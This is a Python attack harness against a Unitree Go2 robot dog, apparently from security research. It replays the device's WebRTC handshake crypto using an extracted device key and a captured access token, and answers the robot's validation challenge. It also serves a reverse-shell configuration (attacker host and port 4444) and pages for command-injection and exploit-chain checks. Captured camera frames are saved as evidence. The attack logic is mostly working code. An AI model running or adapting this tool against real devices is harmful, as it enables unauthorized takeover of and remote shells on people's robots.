#!/usr/bin/env python3
"""
Ring4 Chrome桥: Python 负责 HTTP信令+全部crypto，Chrome负责WebRTC(DataChannel+校验中继)。
端点:
  GET  /            -> chrome_rtc.html
  POST /negotiate   {sdp,type} -> 真狗握手 -> {answer_sdp,answer_type, t}
  POST /fc          {ch} -> {fc: base64(md5("UnitreeGo2_"+ch))}  (校验应答)
  POST /event       {kind,...} -> 记录(消息/状态)
  GET  /status      -> {validated, events}
"""
import os, json, base64, hashlib, secrets, threading, time, secrets as _s
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import pad, unpad

DOG=os.environ.get("DOG_IP","192.168.8.154")
EVD=os.path.join(os.path.dirname(__file__),"..","evidence","myrun")
APPKEY=bytes.fromhex(open(os.path.join(EVD,"dev_key.txt")).read().strip())
TOKEN=<访问令牌_01>,"captured_token.txt")).read().strip()
SERIES_PREFIX="UnitreeGo2_"
PORT=int(os.environ.get("BRIDGE_PORT","9999"))
REV_HOST=os.environ.get("REV_HOST","192.168.8.186")
REV_PORT=int(os.environ.get("REV_PORT","4444"))

STATE={"validated":False,"events":[],"messages":[]}
def ev(k,v): STATE["events"].append((round(time.time(),2),k,v))

def kD(b):
    s=b.strip().replace("-","+").replace("_","/"); s+="="*(-len(s)%4); return json.loads(base64.b64decode(s))
def gcm(b,k):
    r=base64.b64decode(b);n=len(r)-12-16;return AES.new(k,AES.MODE_GCM,nonce=r[n:n+12]).decrypt_and_verify(r[:n],r[n+12:])
def ecb_e(b,k): return base64.b64encode(AES.new(k,AES.MODE_ECB).encrypt(pad(b,16))).decode()
def ecb_d(b,k): return unpad(AES.new(k,AES.MODE_ECB).decrypt(base64.b64decode(b)),16)
def FC(ch): return base64.b64encode(hashlib.md5((SERIES_PREFIX+ch).encode()).digest()).decode()

def negotiate(offer_sdp, mtype):
    r=requests.post(f"http://{DOG}:9991/con_notify",data="{}",timeout=8); o=kD(r.text)
    pt=gcm(o["data1"],APPKEY); m=pt[10:]; E=m[-10:]; pub=RSA.import_key(base64.b64decode(m[:-10]))
    T="".join(str(E[i]-65) for i in range(len(E)) if (i+1)%2==0)
    ob={"sdp":offer_sdp,"type":mtype,"token":<访问令牌_01>,"id":"abcd"}; y=secrets.token_hex(8)
    body={"data1":ecb_e(json.dumps(ob).encode(),y.encode()),
          "data2":base64.b64encode(PKCS1_v1_5.new(pub).encrypt(y.encode())).decode()}
    r2=requests.post(f"http://{DOG}:9991/con_ing_{T}",data=json.dumps(body),timeout=15)
    aj=json.loads(ecb_d(r2.text.strip(),y.encode()))
    return {"answer_sdp":aj["sdp"],"answer_type":aj["type"],"t":T,"reject": aj.get("sdp")=="reject"}

class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def _body(self):
        n=int(self.headers.get("Content-Length",0) or 0)
        return self.rfile.read(n) if n else b""
    def _json(self,o,c=200):
        b=json.dumps(o).encode(); self.send_response(c); self.send_header("Content-Type","application/json")
        self.send_header("Access-Control-Allow-Origin","*"); self.send_header("Content-Length",str(len(b)))
        self.end_headers(); self.wfile.write(b)
    def do_OPTIONS(self):
        self.send_response(204);
        for k,v in {"Access-Control-Allow-Origin":"*","Access-Control-Allow-Methods":"GET,POST,OPTIONS","Access-Control-Allow-Headers":"*","Content-Length":"0"}.items(): self.send_header(k,v)
        self.end_headers()
    def do_GET(self):
        if self.path.startswith("/status"): self._json({"validated":STATE["validated"],"events":STATE["events"][-40:],"nmsg":len(STATE["messages"])}); return
        if self.path.startswith("/revcfg"): self._json({"host":REV_HOST,"port":REV_PORT}); return
        if self.path.startswith("/cmd_verify"):
            page = "go2_cmd_verify.html"
        elif self.path.startswith("/chain_verify"):
            page = "go2_chain_verify.html"
        elif self.path.startswith("/revshell_verify"):
            page = "go2_revshell_verify.html"
        elif self.path.startswith("/pa_verify"):
            page = "go2_pa_verify.html"
        else:
            page = "go2_capture.html"
        p=os.path.join(os.path.dirname(__file__),page)
        b=open(p,"rb").read(); self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        raw=self._body()
        try: d=json.loads(raw.decode() or "{}")
        except Exception: d={}
        if self.path=="/negotiate":
            ev("negotiate-in", f"sdp={len(d.get('sdp',''))}")
            try:
                r=negotiate(d["sdp"], d.get("type","offer")); ev("negotiate-out", f"t={r['t']} reject={r['reject']}")
                self._json(r)
            except Exception as e:
                ev("negotiate-err", repr(e)); self._json({"error":repr(e)},500)
        elif self.path=="/fc":
            self._json({"fc":FC(d.get("ch",""))})
        elif self.path=="/event":
            k=d.get("kind"); ev(k, d.get("data"))
            if k=="validated": STATE["validated"]=True
            if k=="msg": STATE["messages"].append(d.get("data"))
            self._json({"ok":1})
        elif self.path=="/save_frame":
            body=self._body().decode("utf-8","replace")
            if ":" in body:
                tag,data=body.split(":",1)
                import base64 as b64
                raw=b64.b64decode(data)
                out=os.path.join(EVD,f"go2_{tag}.{data.split('.',1)[0] if '.' in data[:4] else 'bin'}")
                if 'jpg' in tag:out=os.path.join(EVD,f"go2_{tag}.jpg")
                elif 'png' in tag:out=os.path.join(EVD,f"go2_{tag}.png")
                else:out=os.path.join(EVD,f"go2_{tag}.bin")
                open(out,"wb").write(raw)
                print(f"[SAVE] {out} ({len(raw)}B)")
                self._json({"ok":1,"size":len(raw),"path":out});return
            self._json({"ok":0});return
        else:
            self._json({"ok":1})

def serve():
    s=ThreadingHTTPServer(("127.0.0.1",PORT),H)
    print(f"[bridge] http://127.0.0.1:{PORT}/")
    s.serve_forever()

if __name__=="__main__":
    serve()
